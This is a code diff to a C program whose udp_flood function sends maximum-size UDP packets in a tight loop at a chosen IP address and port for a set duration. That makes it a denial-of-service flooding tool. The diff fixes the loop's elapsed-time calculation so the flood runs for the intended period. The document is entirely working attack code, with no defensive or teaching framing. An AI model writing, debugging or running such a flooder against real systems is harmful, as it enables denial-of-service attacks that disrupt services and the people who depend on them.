@@ -5,6 +5,7 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <pthread.h>
+#include <time.h>
 
 #define BUFFER_SIZE 65507
 
@@ -24,19 +25,20 @@ void udp_flood(const char *ip, int port, int duration) {
     target.sin_family = AF_INET;
     target.sin_port = htons(port);
     if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
-        perror("Invalid address/ Address not supported");
+        perror("Invalid address/Address not supported");
         exit(EXIT_FAILURE);
     }
 
     memset(buffer, 'A', BUFFER_SIZE);
 
     int time_elapsed = 0;
+    time_t start_time = time(NULL);
     while (time_elapsed < duration) {
         if (sendto(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr *)&target, target_len) < 0) {
             perror("Sendto failed");
             exit(EXIT_FAILURE);
         }
-        time_elapsed = (int)time(NULL) - time_elapsed;
+        time_elapsed = (int)(time(NULL) - start_time);
     }
 
     close(sock);
